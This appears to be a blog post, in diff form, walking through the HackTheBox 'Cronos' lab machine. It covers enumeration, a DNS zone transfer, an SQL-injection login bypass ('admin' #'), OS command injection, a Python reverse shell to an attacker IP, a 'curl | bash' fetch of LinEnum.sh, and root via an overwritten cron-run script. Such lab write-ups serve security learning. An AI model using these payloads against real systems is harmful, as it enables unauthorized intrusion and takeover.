@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Cronos | And here I am the first day of the year, while my family prepares the typical bomb meal, I am just starting another write-up. Cronos should be a...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Cronos</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation">
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="https://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (12)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (14)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-01-01 12:59:00+00:00">Wed 01 January 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Cronos.html">Cronos</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Cronos.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>And here I am the first day of the year, while my family prepares the typical bomb meal, I am just starting another write-up. Cronos should be a relatively easy one so let's crack-on.</p>
+<h1>Initial nmap</h1>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# nmap -sV -sC 10.10.10.13                                                                                                                                                         </span>
+<span class="err">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-01 13:04 GMT                                                                                                                               </span>
+<span class="err">Nmap scan report for 10.10.10.13</span>
+<span class="err">Host is up (0.13s latency).</span>
+<span class="err">Not shown: 997 filtered ports</span>
+<span class="err">PORT   STATE SERVICE VERSION</span>
+<span class="err">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span>
+<span class="err">| ssh-hostkey: </span>
+<span class="err">|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)</span>
+<span class="err">|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)</span>
+<span class="err">|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)</span>
+<span class="err">53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)</span>
+<span class="err">| dns-nsid: </span>
+<span class="err">|_  bind.version: 9.10.3-P4-Ubuntu</span>
+<span class="err">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span>
+<span class="err">|_http-server-header: Apache/2.4.18 (Ubuntu)</span>
+<span class="err">|_http-title: Apache2 Ubuntu Default Page: It works</span>
+<span class="err">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+</pre></div>
+
+
+<p>Looking at the default web server page I get this:</p>
+<p><img alt="" src="../images/apache-cronos.png"></p>
+<p>Someone left this default page there and it's quite unusual. However, I did not find any other useful info.</p>
+<p>I performed a direcorty search on the IP 10.10.10.13 with dirbuster but I did not find anything useful too:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# gobuster dir -u http://10.10.10.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                               </span>
+<span class="err">===============================================================                                                                                                                               </span>
+<span class="err">Gobuster v3.0.1                                                                                                                                                                               </span>
+<span class="err">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)                                                                                                                               </span>
+<span class="err">===============================================================                                                                                                                               </span>
+<span class="err">[+] Url:            http://10.10.10.13                                                                                                                                                        </span>
+<span class="err">[+] Threads:        10                                                                                                                                                                        </span>
+<span class="err">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                              </span>
+<span class="err">[+] Status codes:   200,204,301,302,307,401,403                                                                                                                                               </span>
+<span class="err">[+] User Agent:     gobuster/3.0.1                                                                                                                                                            </span>
+<span class="err">[+] Timeout:        10s                                                                                                                                                                       </span>
+<span class="err">===============================================================                                                                                                                               </span>
+<span class="err">2020/01/01 13:55:28 Starting gobuster                                                                                                                                                         </span>
+<span class="err">===============================================================                                                                                                                               </span>
+<span class="err">/server-status (Status: 403)                                                                                                                                                                  </span>
+<span class="err">===============================================================                                                                                                                               </span>
+<span class="err">2020/01/01 14:32:33 Finished                                                                                                                                                                  </span>
+<span class="err">===============================================================  </span>
+</pre></div>
+
+
+<p>Quite often HTB uses the <strong><em>MachineName.htb</em></strong> convention for its boxes, so since I was stuck I decided to give it a try and use cronos.htb as the hostname. So I added it in the /etc/hosts and when I entered it in the browser I got this:</p>
+<p><img alt="" src="../images/cronos-home.png"></p>
+<p>All the links in the page point to external resources which I won't pursue as it goes beyond the HTB scope. At this point I tried another directory search with gobuster using the hostname instead.</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/cronos# gobuster dir -u http://cronos.htb -t 100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span>
+<span class="err">===============================================================</span>
+<span class="err">Gobuster v3.0.1</span>
+<span class="err">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="err">===============================================================</span>
+<span class="err">[+] Url:            http://cronos.htb</span>
+<span class="err">[+] Threads:        100</span>
+<span class="err">[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span>
+<span class="err">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="err">[+] User Agent:     gobuster/3.0.1</span>
+<span class="err">[+] Timeout:        10s</span>
+<span class="err">===============================================================</span>
+<span class="err">2020/01/01 17:51:55 Starting gobuster</span>
+<span class="err">===============================================================</span>
+<span class="err">/css (Status: 301)</span>
+<span class="err">/js (Status: 301)</span>
+<span class="err">/server-status (Status: 403)</span>
+<span class="err">===============================================================</span>
+<span class="err">2020/01/01 17:56:08 Finished</span>
+<span class="err">===============================================================</span>
+</pre></div>
+
+
+<p>I had a quick look at that css and js directories but nothing interesting in there either. It looks like we have to start looking somewhere else.</p>
+<p>We have port 53/tcp (DNS) open as well so we can explore this option. <strong>dnsrecon</strong> is a great tool for DNS enumeration. Since we have an IP we want to do a reverse lookup. After few failed attempts I found the correct syntax, basically the network range has to be specified to perform a reverse lookup.</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# dnsrecon -n 10.10.10.13 -r 10.10.10.0/24                                                                                                                                         </span>
+<span class="err">[*] Reverse Look-up of a Range                                                                                                                                                                </span>
+<span class="err">[*] Performing Reverse Lookup from 10.10.10.0 to 10.10.10.255                                                                                                                                 </span>
+<span class="err">[*]      PTR ns1.cronos.htb 10.10.10.13                                                                                                                                                       </span>
+<span class="err">[+] 1 Records Found </span>
+</pre></div>
+
+
+<p>This can also be confirmed with nslookup:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# nslookup </span>
+<span class="err">&gt; server 10.10.10.13</span>
+<span class="err">Default server: 10.10.10.13</span>
+<span class="c">Address: 10.10.10.13#53</span>
+<span class="err">&gt; 10.10.10.13</span>
+<span class="err">13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.</span>
+</pre></div>
+
+
+<p>Now that we have this info we can try to enumerate further with a DNS zone transfer. </p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">cronos</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="mf">10.10.10.13</span><span class="w"></span>
+<span class="k">Using</span><span class="w"> </span><span class="k">domain</span><span class="w"> </span><span class="nl">server</span><span class="p">:</span><span class="w"></span>
+<span class="nl">Name</span><span class="p">:</span><span class="w"> </span><span class="mf">10.10.10.13</span><span class="w"></span>
+<span class="nl">Address</span><span class="p">:</span><span class="w"> </span><span class="mf">10.10.10.13</span><span class="n">#53</span><span class="w"></span>
+<span class="nl">Aliases</span><span class="p">:</span><span class="w"> </span>
+
+<span class="n">cronos</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">ns1</span><span class="p">.</span><span class="n">cronos</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w"></span>
+<span class="n">cronos</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="mf">10.10.10.13</span><span class="w"></span>
+<span class="k">admin</span><span class="p">.</span><span class="n">cronos</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="mf">10.10.10.13</span><span class="w"></span>
+<span class="n">ns1</span><span class="p">.</span><span class="n">cronos</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="mf">10.10.10.13</span><span class="w"></span>
+<span class="n">www</span><span class="p">.</span><span class="n">cronos</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="mf">10.10.10.13</span><span class="w"></span>
+</pre></div>
+
+
+<p>Interestingly I find some other names I can now add to out /ets/hosts file and explore. Particularly <strong>admin.cronos.htb</strong> looks interesting:</p>
+<p><img alt="" src="../images/cronos-admin.png"></p>
+<p>I tried few obvious combinations to login without success. At this stage I decided to look manually (could have used sqlmap, burp, etc) for sql injection vulnerabilities in order to bypass the authentication using a cheat sheet available <a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">here</a>.</p>
+<p><img alt="" src="../images/cronos-sql.png"></p>
+<p>It did not take long. When I tried <strong><em>admin' #</em></strong> (with a random password value) as shown above I got in:</p>
+<p><img alt="" src="../images/cronos-trace.png"></p>
+<p>So now I am logged in and I noticed that if I add a semicolon to the IP address followed by another command I will get a response from the OS, indicating that the application is vulnerable to OS command injection. Below an example with the <strong>id</strong> command:</p>
+<p><img alt="" src="../images/cronos-os-injection.png"></p>
+<p>Let's now try to get a shell. I will use the following shell downloaded from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>:</p>
+<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.46&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
+</pre></div>
+
+
+<p>and I will place it next to the IP address (8.8.8.8) instead of the <strong>id</strong> command.</p>
+<p>I also open a netcat listener on port 9999 on my kali box and when I click Execute I get a shell. </p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@Kali</span><span class="p">:</span><span class="o">~</span><span class="c1"># nc -lvnp 9999</span>
+<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="nb">any</span><span class="p">]</span> <span class="mi">9999</span> <span class="o">...</span>
+<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.46</span><span class="p">]</span> <span class="kn">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.13</span><span class="p">]</span> <span class="mi">49038</span>
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span> <span class="mi">0</span><span class="p">:</span> <span class="n">can</span><span class="s1">&#39;t access tty; job control turned off</span>
+<span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@cronos</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">admin</span><span class="err">$</span>
+</pre></div>
+
+
+<p>As shown above I also ran a python command to obtain a full shell. I then locate and read the user.txt</p>
+<div class="highlight"><pre><span></span><span class="err">www-data@cronos:/home/noulis$ locate user.txt</span>
+<span class="err">locate user.txt</span>
+<span class="err">/home/noulis/user.txt</span>
+<span class="err">www-data@cronos:/home/noulis$ cat /home/noulis/user.txt</span>
+<span class="err">cat /home/noulis/user.txt</span>
+<span class="err">51****************************3b</span>
+</pre></div>
+
+
+<hr>
+<p>Now it's time to root the box. I had a quick look at few directories but did not find anything interesting so I decided to run a script called LinEnum.sh that does automatic enumeration on linux. The script is located in my kali box so to run the script I opened a Simple Python Http server on my kali box in the directory where LinEnum.sh is located:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/cronos# ll</span>
+<span class="err">total 64</span>
+<span class="err">-rwxr-xr-x 1 root root  5493 Jan  3 20:14 artisan</span>
+<span class="err">-rw-rw-r-- 1 root root   486 Jan  2 07:36 cronos.req</span>
+<span class="err">-rwxrwxr-x 1 root root 46476 Jan  3 21:05 LinEnum.sh</span>
+<span class="err">-rw-rw-r-- 1 root root    33 Jan  2 14:20 user.txt</span>
+<span class="err">root@Kali:/home/user/Documents/htb/boxes/cronos# python -m SimpleHTTPServer </span>
+<span class="err">Serving HTTP on 0.0.0.0 port 8000 ...</span>
+</pre></div>
+
+
+<p>then I ran this command on the Cronos box (where 10.10.14.46 is the IP of my kali machine):</p>
+<div class="highlight"><pre><span></span><span class="s s-Atom">www</span><span class="o">-</span><span class="s s-Atom">data@</span><span class="nn">cronos</span><span class="p">:</span><span class="s s-Atom">/</span><span class="err">$</span> <span class="s s-Atom">curl</span> <span class="mf">10.10.14.46</span><span class="s s-Atom">:</span><span class="mi">8000</span><span class="o">/</span><span class="nv">LinEnum</span><span class="p">.</span><span class="s s-Atom">sh</span> <span class="p">|</span> <span class="s s-Atom">bash</span>                                                                                                                                    
+<span class="s s-Atom">curl</span> <span class="mf">10.10.14.46</span><span class="s s-Atom">:</span><span class="mi">8000</span><span class="o">/</span><span class="nv">LinEnum</span><span class="p">.</span><span class="s s-Atom">sh</span> <span class="p">|</span> <span class="s s-Atom">bash</span>                                                                                                                                                       
+  <span class="c1">% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                               </span>
+                                 <span class="nv">Dload</span>  <span class="nv">Upload</span>   <span class="nv">Total</span>   <span class="nv">Spent</span>    <span class="nv">Left</span>  <span class="nv">Speed</span>                                                                                                                 
+<span class="mi">100</span> <span class="mi">46476</span>  <span class="mi">100</span> <span class="mi">46476</span>    <span class="mi">0</span>     <span class="mi">0</span>   <span class="mi">114</span><span class="s s-Atom">k</span>      <span class="mi">0</span> <span class="s s-Atom">--:--:--</span> <span class="s s-Atom">--:--:--</span> <span class="s s-Atom">--:--:--</span>  <span class="mi">114</span><span class="s s-Atom">k</span>                                                                                                                
+
+<span class="s s-Atom">#########################################################</span>                                                                                                                                     
+<span class="s s-Atom">#</span> <span class="nv">Local</span> <span class="nv">Linux</span> <span class="nv">Enumeration</span> <span class="s s-Atom">&amp;</span> <span class="nv">Privilege</span> <span class="nv">Escalation</span> <span class="nv">Script</span> <span class="s s-Atom">#</span>                                                                                                                                     
+<span class="s s-Atom">#########################################################</span>                                                                                                                                     
+<span class="s s-Atom">#</span> <span class="s s-Atom">www</span><span class="p">.</span><span class="s s-Atom">rebootuser</span><span class="p">.</span><span class="s s-Atom">com</span>                                                                                                                                                                          
+<span class="s s-Atom">#</span> <span class="s s-Atom">version</span> <span class="mf">0.981</span>  
+</pre></div>
+
+
+<p>I am not pasting the whole output as it is quite long. However the most interesting bit I found it this:</p>
+<div class="highlight"><pre><span></span><span class="err"># m h dom mon dow user  command                                                                                                               </span>
+<span class="err">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly                                                                           </span>
+<span class="err">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )                                           </span>
+<span class="err">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )                                          </span>
+<span class="err">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )                                         </span>
+<span class="err">* * * * *       root    php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1</span>
+</pre></div>
+
+
+<p>particularly the last cron entry runs as root every minute. If we look at the script itself we notice it is owned by the <strong>www-data</strong> user:</p>
+<div class="highlight"><pre><span></span><span class="err">www-data@cronos:/var/www/laravel$ ls -l artisan</span>
+<span class="err">ls -l artisan</span>
+<span class="err">-rw-r--r-- 1 www-data www-data 5493 Jan  3 22:14 artisan</span>
+</pre></div>
+
+
+<p>I remove this file and replace it with a php reverse shell I found in kali (/usr/share/laudanum/php/php-reverse-shell.php). At the same time I open a netcat listener on my kali box on port 8888 and after less than I minute I get my root shell, which allows me to read the root.txt file:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@Kali</span><span class="p">:</span><span class="o">~</span><span class="c1"># nc -lvnp 8888</span>
+<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="nb">any</span><span class="p">]</span> <span class="mi">8888</span> <span class="o">...</span>
+<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.46</span><span class="p">]</span> <span class="kn">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.13</span><span class="p">]</span> <span class="mi">36484</span>
+<span class="n">Linux</span> <span class="n">cronos</span> <span class="mf">4.4</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">72</span><span class="o">-</span><span class="n">generic</span> <span class="c1">#93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+ <span class="mi">23</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mo">02</span> <span class="n">up</span> <span class="mi">1</span> <span class="n">day</span><span class="p">,</span>  <span class="mi">4</span><span class="p">:</span><span class="mi">32</span><span class="p">,</span>  <span class="mi">0</span> <span class="n">users</span><span class="p">,</span>  <span class="n">load</span> <span class="n">average</span><span class="p">:</span> <span class="mf">0.03</span><span class="p">,</span> <span class="mf">0.01</span><span class="p">,</span> <span class="mf">0.00</span>
+<span class="n">USER</span>     <span class="n">TTY</span>      <span class="n">FROM</span>             <span class="n">LOGIN</span><span class="err">@</span>   <span class="n">IDLE</span>   <span class="n">JCPU</span>   <span class="n">PCPU</span> <span class="n">WHAT</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span> <span class="mi">0</span><span class="p">:</span> <span class="n">can</span><span class="s1">&#39;t access tty; job control turned off</span>
+<span class="c1"># python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;);&#39;</span>
+<span class="n">root</span><span class="nd">@cronos</span><span class="p">:</span><span class="o">/</span><span class="c1"># id</span>
+<span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+<span class="n">root</span><span class="nd">@cronos</span><span class="p">:</span><span class="o">/</span><span class="c1"># cat /root/root.txt</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+<span class="mi">17</span><span class="o">****************************</span><span class="n">a0</span>
+</pre></div>
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+
+
+
+</body>
+</html>
